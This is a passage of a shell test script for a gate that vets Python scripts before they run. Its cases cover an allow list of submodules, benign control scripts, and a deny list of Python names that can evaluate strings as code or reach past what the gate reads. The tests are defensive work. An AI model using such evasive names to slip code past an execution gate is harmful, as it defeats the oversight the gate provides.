  run_72 "python3 sub-$sub.py msg.json"
  if [ "$kind" = listed ]; then allowed "#3172 a submodule on the list by its own name passes: $sub"
  else read_refused "#3172 a submodule not on the list by its own name is refused: $sub"; fi
done < "$D72/subs.txt"
# The controls: json read and written to the screen, its decoder and html's parser imported as real
# code in this repository imports them (lib/local-allow-rules.py, skills/design-rounds/design_file.py),
# html.parser also as `import html.parser`, sys used as scripts use it, and a field named sys read, printed,
# rounded, formatted, compared and added, which is a field (PR #3161), also when a conditional picks
# it into a name.
cat > "$D72/reads-3172.py" <<'PY'
import collections, html.parser, json, sys
import sys as s
from html.parser import HTMLParser
from json.decoder import JSONDecodeError, scanstring
class Times:
    def __init__(self):
        self.sys, self.user = 0.5, 1.5
    def total(self):
        return round(self.sys, 1) + self.user
t = Times()
q = t.sys if t.user else 0
assert 0 < t.sys <= 1.5 and t.sys != -1 and t.sys + 1 > 1
try:
    data = json.load(open(sys.argv[1]))
except JSONDecodeError as e:
    print(e, file=sys.stderr)
    sys.exit(1)
print(json.dumps(data, indent=2), isinstance(data, collections.abc.Iterable), scanstring('"a"', 1)[0], HTMLParser, html.parser.HTMLParser)
print(t.sys, round(t.sys), str(t.sys), f"{t.sys:.1f}", t.sys == 0.5, -t.sys, t.sys * 2, t.total(), round(q))
json.dump(data, sys.stdout)
s.stdout.write(s.argv[0] + "\n")
if __name__ == "__main__":
    print(t.sys * 3)
PY
run_72 "python3 reads-3172.py msg.json"
allowed "#3172 the control: json, its decoder, html.parser, collections' abc, sys and a field named sys used as scripts use them pass"
run_72 "python3 reads-3172.py $RULES"
allowed "#3172 and handed the real rules file"
run_72 "python3 -m json.tool msg.json"
allowed "#3172 and python3 -m json.tool printing a file, which the gate reads as a program, still passes"
# A name on PY_REACH used as a plain name is refused with what that name does: only the typing
# names evaluate a string as code; enum's builtins, sys's hooks and the rest reach past what the
# gate reads (the message said "can evaluate a string as code" for all of them until #3172).
w72 name-bltns.py 'import sys' 'def f(bltns):' '    return bltns' 'print(f(1), sys.argv[1])'
w72 name-forwardref.py 'import sys' 'def f(ForwardRef):' '    return ForwardRef' 'print(f(1), sys.argv[1])'
run_72 "python3 name-bltns.py msg.json"
says "#3172 a name that is builtins is not said to evaluate a string" "reaches past what the gate reads (bltns)"
run_72 "python3 name-forwardref.py msg.json"
says "#3172 a typing name still says it evaluates a string as code" "can evaluate a string as code (ForwardRef)"

echo

sdg_harness_result
